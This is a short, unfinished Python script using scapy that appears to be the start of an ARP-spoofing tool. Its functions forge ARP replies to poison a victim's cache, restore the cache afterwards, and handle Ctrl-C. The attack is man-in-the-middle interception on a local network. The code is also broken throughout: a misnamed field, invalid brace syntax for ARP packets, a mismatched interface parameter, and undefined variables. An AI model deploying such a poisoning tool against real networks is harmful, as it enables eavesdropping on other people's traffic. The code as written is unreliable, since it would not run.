
from scapy.all import *
import time
import sys
import signal
import argparse

def get_mac(ip,iface):
    arp_req = Ether(des="ff:ff:ff:ff:ff:ff")
    res = srp1(arp_req,timeout=2,iface=iface,verbose=0)
    return res.hwsrc if res else None
def poison(target_ip,target_mac,spoof_ip,iface0):
    arp_response = ARP{
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip
    }
    send(arp_response,iface=iface,verbose=0)

def restore(target_ip,target_mac,source_ip,source_mac,iface):
    arp_response = ARP{
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=source_ip,
        hwsrc=source_mac
    }
    send(arp_response, iface=iface,verbose=0,count=5)

#handling signals ctr-c ctr-x ...etc keyboard signals sys 
def signal_handler(sig,frame):
    print("\n Restoring")
    restore(args.victim,victim_mac,args.gateway,)
    
